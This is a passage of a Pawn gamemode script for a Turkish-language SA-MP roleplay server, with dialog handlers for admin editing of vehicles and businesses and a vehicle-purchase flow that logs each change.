	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
	        new sahip = strval(inputtext);
	        new string[128];
	        new tmpcar = GetClosestVehicle(playerid);
	        if(tmpcar == 0)
	        {
	            return 1;
			}
	        Arac[tmpcar][aisyeri] = sahip;
	        AracKaydet(tmpcar);
	        format(string, sizeof(string), "Araç bilgileri ve log dosyasý kaydedildi! Yeni araç kilometresi: %d olarak deðiþtirildi.",sahip);
	        Bilgi(playerid, string);
			format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin iþyerini %d olarak degistirdi.", tmpcar, sahip);
			Log(playerid, string);
		}
		return 1;
	}
	if(dialogid == 9834)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
	        new sahip = strval(inputtext);
	        new string[128];
	        new tmpcar = GetClosestVehicle(playerid);
	        if(tmpcar == 0)
	        {
	            return 1;
			}
	        Arac[tmpcar][akm] = sahip;
	        AracKaydet(tmpcar);
	        format(string, sizeof(string), "Araç bilgileri ve log dosyasý kaydedildi! Yeni araç tipi: %d olarak deðiþtirildi.",sahip);
	        Bilgi(playerid, string);
			format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin kilometresini %d olarak degistirdi.", tmpcar, sahip);
			Log(playerid, string);
		}
		return 1;
	}
	if(dialogid == 9833)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
	        new sahip = strval(inputtext);
	        new string[128];
	        new tmpcar = GetClosestVehicle(playerid);
	        if(tmpcar == 0)
	        {
	            return 1;
			}
	        Arac[tmpcar][atip] = sahip;
	        Arac[tmpcar][abirlik] = 255;
	        AracKaydet(tmpcar);
	        format(string, sizeof(string), "Araç bilgileri ve log dosyasý kaydedildi! Yeni araç tipi: %d olarak deðiþtirildi.",sahip);
	        Bilgi(playerid, string);
			format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin tipini %d olarak degistirdi.", tmpcar, sahip);
			Log(playerid, string);
		}
		return 1;
	}
	if(dialogid == 9832)
	{
	    if(response)
	    {
	        new aracid = GetPlayerVehicleID(playerid);
			if(!strcmp(inputtext, " "))
			{
			    format(Arac[aracid][atextyazi],100,"");
			    Arac[aracid][atextdurum] = 0;
			    DestroyDynamic3DTextLabel(Plaka3DText[aracid]);
			    Bilgi(playerid, "Tampon yazýsýný sildiniz.");
			    AracKaydet(aracid);
   				ShowPlayerDialog(playerid, 9832, DIALOG_STYLE_INPUT, "Araç tampon yazýsýný düzenleyin!", "Tampon yazýsýný silmek istiyorsanýz dialogu boþ býrakýn.\nTampon yazýsýný girin:", "Onayla", "Kapat");
				return 1;
			}
			if(strlen(inputtext) > 60)
			{
			    Hata(playerid, "Tampon yazýsý 60 karakterden uzun olamaz.");
			    return 1;
			}
			new Float:PX, Float:PY, Float:PZ;
			GetVehiclePos(playerid, PX, PY, PZ);
			//Delete3DTextLabel(Plaka3DText[aracid]);
			if(Arac[aracid][atextdurum] == 1)
			{
			    format(Arac[aracid][atextyazi],100,"%s",inputtext);
				UpdateDynamic3DTextLabelText(Plaka3DText[aracid], 0xFFFFFFFF, Arac[aracid][atextyazi]);
				return 1;
			}
			format(Arac[aracid][atextyazi],100,"%s",inputtext);
   			if(Arac[aracid][amodel] == 523) {
	 		Plaka3DText[aracid] = CreateDynamic3DTextLabel(inputtext, 0xFFFFFFFF, -0.3, -0.8, -0.3, 13.0, .worldid=GetPlayerVirtualWorld(playerid), .testlos=1, .attachedvehicle=aracid);
			}
	  		else {
			Plaka3DText[aracid] = CreateDynamic3DTextLabel(inputtext, 0xFFFFFFFF, -0.7, -2.3, -0.3, 13.0, .worldid=GetPlayerVirtualWorld(playerid), .testlos=1, .attachedvehicle=aracid);
			}
			//Attach3DTextLabelToVehicle(Plaka3DText[aracid], aracid,0.0-0.7, 0.0-2.7, 0.0);
			Arac[aracid][atextdurum] = 1;
			Bilgi(playerid, "Tampon yazýsý güncellendi.");
			AracKaydet(aracid);
		}
		return 1;
	}
	if(dialogid == 5)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
	        new sahip = strval(inputtext);
	        new string[128];
	        new tmpcar = GetClosestVehicle(playerid);
	        if(tmpcar == 0)
	        {
	            return 1;
			}
	        Arac[tmpcar][aowner] = sahip;
	        Arac[tmpcar][abirlik] = 255;
	        AracKaydet(tmpcar);
	        format(string, sizeof(string), "Araç bilgileri ve log dosyasý kaydedildi! Yeni araç sahibi: %d olarak deðiþtirildi.",sahip);
	        Bilgi(playerid, string);
			format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin sahibini %d olarak degistirdi.", tmpcar, sahip);
			Log(playerid, string);
		}
		return 1;
	}
	if(dialogid == 6)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
		    new arabamodel = strval(inputtext);
		    new string[128];
		    if(arabamodel < 400 || arabamodel > 611) return Hata(playerid, "Hatalý bir model ID deðeri girdiniz.");
		    new h = GetPlayerVehicleID(playerid);
			Arac[h][amodel] = arabamodel;
			GetVehiclePos(h, Arac[h][aposx], Arac[h][aposy], Arac[h][aposz]);
			ReCreateVehicle(h);
			AracKaydet(h);
			format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin modelini %d olarak degistirdi.", h, arabamodel);
			Log(playerid, string);
			return 1;
		}
		else Hata(playerid, "Bu iþlemi gerçekleþtirebilmek için araç içerisinde olmalýsýnýz.");
		return 1;
	}
	if(dialogid == 7)
	{
	    new string[128];
     	new tmpcar = GetClosestVehicle(playerid);
	    if(tmpcar == 0)
	    {
	    	return 1;
		}
		if(!strlen(inputtext))
		{
		    strmid(Arac[tmpcar][aplaka], "(Yok)", 0, 5, 255);
			SetVehicleNumberPlate(tmpcar, Arac[tmpcar][aplaka]);
		    AracKaydet(tmpcar);
		    Bilgi(playerid, "Dialogu boþ býraktýðýnýz için plaka varsayýlaný (Yok) olarak ayarlandý.");
		    return 1;
		}
		strmid(Arac[tmpcar][aplaka], inputtext, 0, strlen(inputtext), 255);
		format(string, sizeof(string), "Aracýn plakasý %s olarak deðiþtirildi.", inputtext);
		Bilgi(playerid, string);
		SetVehicleNumberPlate(tmpcar, Arac[tmpcar][aplaka]);
		AracKaydet(tmpcar);
		format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin plakasini %s olarak degistirdi.", tmpcar, inputtext);
		Log(playerid, string);
		return 1;
	}
	if(dialogid == 8)
	{
     	new tmpcar = GetClosestVehicle(playerid);
     	new string[128];
	    if(tmpcar == 0)
	    {
	    	return 1;
		}
	    if(!strlen(inputtext))
	    {
	        return 1;
		}
		new fiyat = strval(inputtext);
		format(string, sizeof(string), "Aracýn fiyatýný %d$ olarak deðiþtirdiniz.", fiyat);
		Bilgi(playerid, string);
		Arac[tmpcar][afiyat] = fiyat;
		AracKaydet(tmpcar);
		format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin fiyatini %d$ olarak degistirdi.", tmpcar, fiyat);
		Log(playerid, string);
		return 1;
	}
	if(dialogid == 9)
	{
	    new tmpcar = GetClosestVehicle(playerid);
	    new string[128];
	    if(tmpcar == 0)
	    {
	    	return 1;
		}
	    if(!strlen(inputtext))
	    {
	        return 1;
		}
		new renk1 = strval(inputtext);
		Arac[tmpcar][arenk1] = renk1;
		acol1[tmpcar] = renk1;
		AracKaydet(tmpcar);
		format(string, sizeof(string), "Araç renk 1 deðeri %d olarak deðiþtirildi.", renk1);
		Bilgi(playerid, string);
		ChangeVehicleColor(tmpcar, Arac[tmpcar][arenk1], Arac[tmpcar][arenk2]);
		format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin renk1 kodunu %d olarak degistirdi.", tmpcar, renk1);
		Log(playerid, string);
		return 1;
	}
	if(dialogid == 10)
	{
	    new tmpcar = GetClosestVehicle(playerid);
	    new string[128];
	    if(tmpcar == 0)
	    {
	    	return 1;
		}
	    if(!strlen(inputtext))
	    {
	        return 1;
		}
		new renk2 = strval(inputtext);
		Arac[tmpcar][arenk2] = renk2;
		acol2[tmpcar] = renk2;
		AracKaydet(tmpcar);
		format(string, sizeof(string), "Araç renk 2 deðeri %d olarak deðiþtirildi.", renk2);
		Bilgi(playerid, string);
		ChangeVehicleColor(tmpcar, Arac[tmpcar][arenk1], Arac[tmpcar][arenk2]);
		format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin renk2 kodunu %d olarak degistirdi.", tmpcar, inputtext);
		Log(playerid, string);
		return 1;
	}
	if(dialogid == 11)
	{
	    new tmpcar = GetClosestVehicle(playerid);
	    new string[128];
	    if(tmpcar == 0)
	    {
	    	return 1;
		}
	    if(!strlen(inputtext))
	    {
	        return 1;
		}
		new benzin = strval(inputtext);
		Arac[tmpcar][abenzin] = benzin;
		AracKaydet(tmpcar);
		format(string, sizeof(string), "Araç benzin deðeri %d olarak deðiþtirildi.", benzin);
		Bilgi(playerid, string);
		format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin benzinini %d olarak degistirdi.", tmpcar, benzin);
		Log(playerid, string);
		return 1;
	}
	if(dialogid == 12)
	{
	    new tmpcar = GetClosestVehicle(playerid);
	    new string[128];
	    if(tmpcar == 0)
	    {
	    	return 1;
		}
	    if(!strlen(inputtext))
	    {
	        return 1;
		}
		new hasar = strval(inputtext);
		Arac[tmpcar][ahasar] = hasar;
		AracKaydet(tmpcar);
		format(string, sizeof(string), "Araç hasar deðeri %f olarak deðiþtirildi.", hasar);
		Bilgi(playerid, string);
		format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin hasarini %f olarak degistirdi.", tmpcar, hasar);
		Log(playerid, string);
		return 1;
	}
	if(dialogid == 13)
	{
	    if(!response) { }
	    if(response)
	    {
			AracSatinalMenu(playerid);
	    }
	    return 1;
	}
	if(dialogid == 14)
	{
	    if(!response) { }
	    if(response)
	    {
			new nstring[128],amodel2=SectigiArac[playerid],aracadi[64];
			for(new i = 0; i < sizeof(GaleriListesi) ; i++)
			{
			    if(amodel2 == GaleriListesi[i][0])
			    {
					format(aracadi, sizeof(aracadi), "%s",GaleriListesi[i][3]);
				}
			}
			if(!strlen(inputtext))
			{
			    Hata(playerid, "Bu renk kodu geçersizdir.");
			    format(nstring,sizeof(nstring),""C7"EIGHTBORN - "C8"Araç Renk 1 [ "C2"%s(%d) "C1"]", aracadi, amodel2);
		        ShowPlayerDialog(playerid, 14, DIALOG_STYLE_INPUT, nstring, "{FFFFFF}Aracýnýzýn birincil renk kodunu girin:\n{B3B3B3}(( ÝPUCU: 0-255 arasý ))","Seç","");
			}
			else
			{
			    if(strval(inputtext) < 0 || strval(inputtext) > 255)
			    {
			        format(nstring,sizeof(nstring),""C7"EIGHTBORN - "C8"Araç Renk 1 [ "C2"%s(%d) "C1"]", aracadi, amodel2);
			        Hata(playerid, "Bu renk kodu geçersizdir. Yalnýzca 0-255 arasýndaki rakamlar geçerlidir.");
			        ShowPlayerDialog(playerid, 14, DIALOG_STYLE_INPUT, nstring, "{FFFFFF}Aracýnýzýn birincil renk kodunu girin:\n{B3B3B3}(( ÝPUCU: 0-255 arasý ))","Seç","");
				}
				SectigiAracRenk1[playerid] = strval(inputtext);
				AracSatinalMenu(playerid);
			}
	    }
	    return 1;
	}
	if(dialogid == 15)
	{
	    if(!response) { }
	    if(response)
	    {
	        new nstring[128],amodel2=SectigiArac[playerid],aracadi[64];
			for(new i = 0; i < sizeof(GaleriListesi) ; i++)
			{
			    if(amodel2 == GaleriListesi[i][0])
			    {
					format(aracadi, sizeof(aracadi), "%s",GaleriListesi[i][3]);
				}
			}
	        if(!strlen(inputtext))
	        {
	            Hata(playerid, "Bu renk kodu geçersizdir.");
	            format(nstring,sizeof(nstring),""C7"EIGHTBORN - "C8"Araç Renk 2 [ "C2"%s(%d) "C1"]", aracadi, amodel2);
				ShowPlayerDialog(playerid, 15, DIALOG_STYLE_INPUT, nstring, "{FFFFFF}Aracýnýzýn ikincil renk kodunu girin:\n{B3B3B3}(( ÝPUCU: 0-255 arasý ))","Seç","");
			}
			else
			{
			    if(strval(inputtext) < 0 || strval(inputtext) > 255)
			    {
			        Hata(playerid, "Bu renk kodu geçersizdir. Yalnýzca 0-255 arasýndaki rakamlar geçerlidir.");
			        format(nstring,sizeof(nstring),""C7"EIGHTBORN - "C8"Araç Renk 2 [ "C2"%s(%d) "C1"]", aracadi, amodel2);
					ShowPlayerDialog(playerid, 15, DIALOG_STYLE_INPUT, nstring, "{FFFFFF}Aracýnýzýn ikincil renk kodunu girin:\n{B3B3B3}(( ÝPUCU: 0-255 arasý ))","Seç","");
				}
				SectigiAracRenk2[playerid] = strval(inputtext);
				AracSatinalMenu(playerid);
   			}
	    }
	    return 1;
	}
	if(dialogid == 16)
	{
	    if(!response) { }
		if(response)
		{
	       // new string[128];
			if(Karakter[playerid][para] >= AldigiAracFiyati[playerid])
			{
				new query[1024];
				format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
	            new Cache:cache = mysql_query(query,true);
	            new new_vehicle_sql_id = cache_insert_id();
				cache_delete(cache);
				new vehicleid = CreateVehicle(SectigiArac[playerid], 555.704406, -1272.088256, 19.052700, 0, SectigiAracRenk1[playerid], SectigiAracRenk2[playerid], -1);

				if(IsValidVehicle(vehicleid))
				{
				    Arac[vehicleid][aid] = new_vehicle_sql_id;
				    Arac[vehicleid][amodel] = SectigiArac[playerid];
				    Arac[vehicleid][arenk1] = SectigiAracRenk1[playerid];
				    Arac[vehicleid][arenk2] = SectigiAracRenk2[playerid];
				    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
				    Arac[vehicleid][aposx] = 555.704406;
				    Arac[vehicleid][aposy] = -1272.088256;
				    Arac[vehicleid][aposz] = 19.052700;
				    Arac[vehicleid][afiyat] = AldigiAracFiyati[playerid];
				    Arac[vehicleid][ahasar] = 1000.0;
				    Arac[vehicleid][alights] = 0;
				    Arac[vehicleid][abenzin] = 100.0;
				    Arac[vehicleid][apaintjob] = 99;
				    Arac[vehicleid][aspawn] = 1;
					Arac[vehicleid][akilittip] = 1;
					Arac[vehicleid][aimmo] = 1;
					Arac[vehicleid][aalarm] = 1;
					Arac[vehicleid][atip] = 1;
					Arac[vehicleid][abirlik] = 255;
					new plakakyd[128];
	    			format(plakakyd, sizeof(plakakyd), "(Yok)");
			     	strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
					AracKaydet(vehicleid);

		 			LinkVehicleToInterior(vehicleid, 0);
					SetVehicleVirtualWorld(vehicleid, 0);
					SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
					SetVehicleToRespawn(vehicleid);
					if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

					GivePlayerCash(playerid, -AldigiAracFiyati[playerid]);
					Bilgi(playerid, "Yeni bir araç satýn aldýnýz! - /yardim");
					new araclogla[110];
					format(araclogla,sizeof(araclogla),"id:%d model: %d fiyat: %d renk1: %d aowner: %d",Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat],Arac[vehicleid][arenk1], Arac[vehicleid][aowner]);
					printf(araclogla);
					format(araclogla, sizeof(araclogla), "[GALERI - /a satinal] Galeriden %d idli araci satin aldi. model: %d fiyat: %d aowner: %d", Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat], Arac[vehicleid][aowner]);
					Log(playerid, araclogla);
				}
				return 1;
			}
			else
			{
				return 1;
			}
		}
		return 1;
	}
	if(dialogid == 17)
	{
		if(response)
		{
		    new yakindaki = IsyeriMesafesi(2.0,playerid);
			if(yakindaki == 0)
			{
			    return 1;
			}
		    if(listitem == 0)
		    {
		        ShowPlayerDialog(playerid, 18, DIALOG_STYLE_INPUT, "Ýþyeri adýný düzenleyin!", "Eski iþyeri adý loglara kaydedildi.\nYeni iþyeri adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 19, DIALOG_STYLE_INPUT, "Ýþyeri sahibini düzenleyin!", "Eski iþyeri sahibi loglara kaydedildi.\nYeni iþyeri sahibinin SQLid deðerini girin:", "Onayla", "Kapat");
			}
			if(listitem == 2)
			{
			    ShowPlayerDialog(playerid, 20, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri giriþ X deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 3)
			{
			    ShowPlayerDialog(playerid, 21, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri giriþ Y deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 4)
			{
			    ShowPlayerDialog(playerid, 22, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri giriþ Z deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 5)
			{
			    ShowPlayerDialog(playerid, 23, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri giriþ VW deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 6)
			{
			    ShowPlayerDialog(playerid, 24, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri giriþ INT deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 7)
			{
			    ShowPlayerDialog(playerid, 25, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri giriþ ANGLE deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 8)
			{
			    ShowPlayerDialog(playerid, 26, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri cikisX deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 9)
			{
			    ShowPlayerDialog(playerid, 27, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri cikisY deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 10)
			{
			    ShowPlayerDialog(playerid, 28, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri cikisZ deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 11)
			{
			    ShowPlayerDialog(playerid, 29, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri cikis INT deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 12)
			{
			    ShowPlayerDialog(playerid, 30, DIALOG_STYLE_INPUT, "Ýþyeri koordinatlarýný düzenleyin!", "Eski iþyeri cikis ANGLE deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 13)
			{
			    ShowPlayerDialog(playerid, 31, DIALOG_STYLE_INPUT, "Ýþyeri fiyatýný düzenleyin!", "Eski iþyeri fiyatý loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 14)
			{
			    ShowPlayerDialog(playerid, 32, DIALOG_STYLE_INPUT, "Ýþyeri giriþ ücretini düzenleyin!", "Eski iþyeri giriþ miktarý loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 15)
			{
			    ShowPlayerDialog(playerid, 33, DIALOG_STYLE_INPUT, "Ýþyeri kasasýný düzenleyin!", "Eski iþyeri kasa miktarý loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 16)
			{
			    ShowPlayerDialog(playerid, 8883, DIALOG_STYLE_INPUT, "Ýþyeri vergisini düzenleyin!", "Eski vergi deðeri loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 17)
			{
			    ShowPlayerDialog(playerid, 34, DIALOG_STYLE_INPUT, "Ýþyeri kilit durumunu düzenleyin!", "Eski iþyeri kilit deðeri loglara kaydedildi.\n1 KÝLÝTLÝ - 0 AÇIK\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 18)
			{
			    ShowPlayerDialog(playerid, 35, DIALOG_STYLE_INPUT, "Ýþyeri tipini düzenleyin!", "Eski iþyeri tipi loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 19)
			{
			    ShowPlayerDialog(playerid, 36, DIALOG_STYLE_INPUT, "Ýþyeri yedek anahtarýný düzenleyin!", "Eski iþyeri yedek anahtarý SQLid loglara kaydedildi.\n( Yedek anahtarý vermek istediðiniz SQLid )\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 20)
			{
			    ShowPlayerDialog(playerid, 37, DIALOG_STYLE_INPUT, "Ýþyeri stoðunu düzenleyin!", "Eski iþyeri stoðu loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
			if(listitem == 21)
			{
			    ShowPlayerDialog(playerid, 161, DIALOG_STYLE_INPUT, "Ýþyeri cikisVW", "Eski iþyeri cikisVW loglara kaydedildi.\nYeni deðeri girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
//"	Ad:\t%s\nSahip:\t%d (SQLid)\nGiris X:\t%d\nGiris Y:\t%d\nGiris Z:\t%d\nGiris VW:\t%d\nGiris INT:\t%d\nGiris ANGLE:\t%d\nCikis X:\t%d\nCikis Y:\t%d\nCikis Z:\t%d\nCikis INT:\t%d\nCikis ANGLE:\t%d\nFiyat:\t$%d\nGiris ucreti:\t$%d\nKasa:\t$%d\nKilit:\t%d\nTip:\t%d\nYedek Anahtar:\t%d
	if(dialogid == 18)
	{
        new yakindaki = IsyeriMesafesi(2.0,playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
	        new string[128];
	        if(yakindaki == 0)
	        {
	            return 1;
			}
	        strmid(Isyeri[yakindaki][iad], inputtext, 0, strlen(inputtext), 255);
	        IsyeriKaydet(yakindaki);
	        format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri adý: %s olarak deðiþtirildi.",inputtext);
	        Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin adini %s olarak degistirdi.", yakindaki, inputtext);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 19)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new sahip = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][isahip] = sahip;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri sahibi: %f olarak deðiþtirildi.", sahip);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin sahibini %f olarak degistirdi.", yakindaki, sahip);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 20)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyx = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][girisX] = isyx;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri girisX degeri: %f olarak degistirildi.", isyx);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin girisX degerini %f olarak degistirdi.", yakindaki, isyx);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 21)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyy = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][girisY] = isyy;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri girisY degeri: %f olarak degistirildi.", isyy);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin girisY degerini %f olarak degistirdi.", yakindaki, isyy);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 22)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyz = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][girisZ] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri girisZ degeri: %f olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin girisZ degerini %f olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 23)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][igirisvw] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri girisVW degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin girisVW degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 24)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][igirisint] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri girisINT degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin girisINT degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 25)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][girisangle] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri girisANGLE degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin girisANGLE degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 26)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyx = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][cikisX] = isyx;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri cikisX degeri: %f olarak degistirildi.", isyx);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin cikisX degerini %f olarak degistirdi.", yakindaki, isyx);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 27)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyy = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][cikisY] = isyy;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri cikisY degeri: %f olarak degistirildi.", isyy);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin cikisY degerini %f olarak degistirdi.", yakindaki, isyy);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 28)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
